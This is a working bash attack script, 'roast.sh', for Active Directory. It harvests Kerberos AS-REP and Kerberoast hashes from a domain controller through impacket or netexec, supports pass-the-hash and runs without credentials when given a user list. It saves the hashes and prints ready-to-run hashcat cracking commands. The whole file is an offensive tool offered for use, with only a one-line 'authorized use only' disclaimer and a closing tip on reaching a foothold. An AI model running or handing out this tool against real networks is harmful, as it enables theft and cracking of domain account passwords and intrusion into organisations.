#!/usr/bin/env bash
#
# roast.sh - Kerberos AS-REP & Kerberoast harvester + crack helper
# -----------------------------------------------------------------------------
# Collects crackable Kerberos hashes and hands you ready-to-run hashcat lines:
#   1. AS-REP roasting - targets accounts with "Do not require Kerberos
#      preauth". Works with NO credentials if you supply a username list.
#   2. Kerberoasting - requests TGS tickets for SPN-enabled service accounts.
#      Requires ANY valid domain credential.
#   3. Writes hashes to files and prints the exact hashcat commands (rockyou +
#      OneRule rules) for offline cracking.
#
# Prefers impacket (GetNPUsers / GetUserSPNs); falls back to netexec modules.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: domains you own or are explicitly permitted to test.
# -----------------------------------------------------------------------------
#
# USAGE:
#   AS-REP (no creds):   ./roast.sh -d <domain> -i <dc_ip> -U <userlist>
#   AS-REP (creds):      ./roast.sh -d <domain> -i <dc_ip> -u <user> -p <pass>
#   Kerberoast (creds):  ./roast.sh -d <domain> -i <dc_ip> -u <user> -p <pass>
#   Pass-the-hash:       ./roast.sh -d <domain> -i <dc_ip> -u <user> -H <lm:nt>
#
# EXAMPLES:
#   ./roast.sh -d corp.local -i 10.10.10.10 -U users.txt
#   ./roast.sh -d corp.local -i 10.10.10.10 -u svc_sql -p 'Summer2026!'
#
# DEPENDENCIES (degraded gracefully):
#   impacket (GetNPUsers.py / GetUserSPNs.py)   - preferred
#   netexec (nxc)                               - fallback
#   hashcat + /opt/data/wordlists               - for the printed crack commands
# -----------------------------------------------------------------------------

set -euo pipefail

c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

DOMAIN="" DC_IP="" USER="" PASS="" HASH="" ULIST="" OUT=""
usage(){ sed -n '2,33p' "$0"; exit 1; }
while getopts "d:i:u:p:H:U:o:h" o; do case "$o" in
  d) DOMAIN=$OPTARG;; i) DC_IP=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;;
  H) HASH=$OPTARG;; U) ULIST=$OPTARG;; o) OUT=$OPTARG;; *) usage;;
esac; done
[ -z "$DOMAIN" ] || [ -z "$DC_IP" ] && { c_err "need -d and -i"; usage; }

OUT=${OUT:-"./roast_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"
WL=/opt/data/wordlists/rockyou.txt; [ -f "$WL" ] || WL=/usr/share/wordlists/rockyou.txt
RULE=/opt/data/wordlists/rules/OneRuleToRuleThemStill.rule
RULEARG=""; [ -f "$RULE" ] && RULEARG="-r $RULE"

GETNP=$(command -v GetNPUsers.py || command -v impacket-GetNPUsers || true)
GETSPN=$(command -v GetUserSPNs.py || command -v impacket-GetUserSPNs || true)
NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done

# ---- AS-REP roasting -------------------------------------------------------
c_step "AS-REP roasting"
if [ -n "$ULIST" ] && [ -n "$GETNP" ]; then
  c_info "Trying each user in $ULIST (no creds needed)..."
  "$GETNP" "$DOMAIN/" -no-pass -usersfile "$ULIST" -dc-ip "$DC_IP" -format hashcat -outputfile asrep_hashes.txt 2>&1 \
    | grep -iE '\$krb5asrep|getting tgt|error' || true
elif [ -n "$USER" ] && [ -n "$GETNP" ]; then
  CREDP="$PASS"; [ -n "$HASH" ] && CREDP=""
  "$GETNP" "$DOMAIN/$USER:$CREDP" -request -dc-ip "$DC_IP" -format hashcat -outputfile asrep_hashes.txt 2>&1 \
    | grep -iE '\$krb5asrep|error' || true
elif [ -n "$NXC" ] && [ -n "$USER" ]; then
  c_warn "impacket not found - using netexec --asreproast"
  $NXC ldap "$DC_IP" -u "$USER" ${HASH:+-H "$HASH"} ${HASH:+} ${PASS:+-p "$PASS"} --asreproast asrep_hashes.txt 2>&1 | tail -5 || true
else
  c_warn "AS-REP needs either -U <userlist> (no creds) or -u/-p (creds), plus impacket/netexec"
fi
if [ -s asrep_hashes.txt ]; then
  c_ok "AS-REP hashes -> $(pwd)/asrep_hashes.txt  ($(grep -c krb5asrep asrep_hashes.txt 2>/dev/null || echo '?') found)"
  echo "hashcat -m 18200 asrep_hashes.txt $WL $RULEARG --force" > crack_asrep.cmd
  c_info "Crack: $(cat crack_asrep.cmd)"
fi

# ---- Kerberoasting ---------------------------------------------------------
c_step "Kerberoasting"
if [ -n "$USER" ] && [ -n "$GETSPN" ]; then
  c_info "Requesting TGS for all SPNs as '$USER'..."
  SPNAUTH=( "$DOMAIN/$USER" -dc-ip "$DC_IP" -request -outputfile kerb_hashes.txt )
  if [ -n "$HASH" ]; then "$GETSPN" "${SPNAUTH[@]}" -hashes "$HASH" 2>&1 | grep -iE 'ServicePrincipalName|krb5tgs|error' || true
  else "$GETSPN" "${SPNAUTH[@]}" -p "$PASS" 2>&1 | grep -iE 'ServicePrincipalName|krb5tgs|error' || true; fi
elif [ -n "$USER" ] && [ -n "$NXC" ]; then
  c_warn "impacket not found - using netexec --kerberoasting"
  $NXC ldap "$DC_IP" -u "$USER" ${HASH:+-H "$HASH"} ${PASS:+-p "$PASS"} --kerberoasting kerb_hashes.txt 2>&1 | tail -5 || true
else
  c_warn "Kerberoasting requires valid creds (-u with -p or -H) and impacket/netexec"
fi
if [ -s kerb_hashes.txt ]; then
  c_ok "Kerberoast hashes -> $(pwd)/kerb_hashes.txt  ($(grep -c krb5tgs kerb_hashes.txt 2>/dev/null || echo '?') found)"
  echo "hashcat -m 13100 kerb_hashes.txt $WL $RULEARG --force" > crack_kerb.cmd
  c_info "Crack: $(cat crack_kerb.cmd)"
fi

c_step "DONE"
c_ok "Results under: $(pwd)"
c_info "Tip: service accounts often have weak passwords - Kerberoast is usually the fastest path to a foothold."
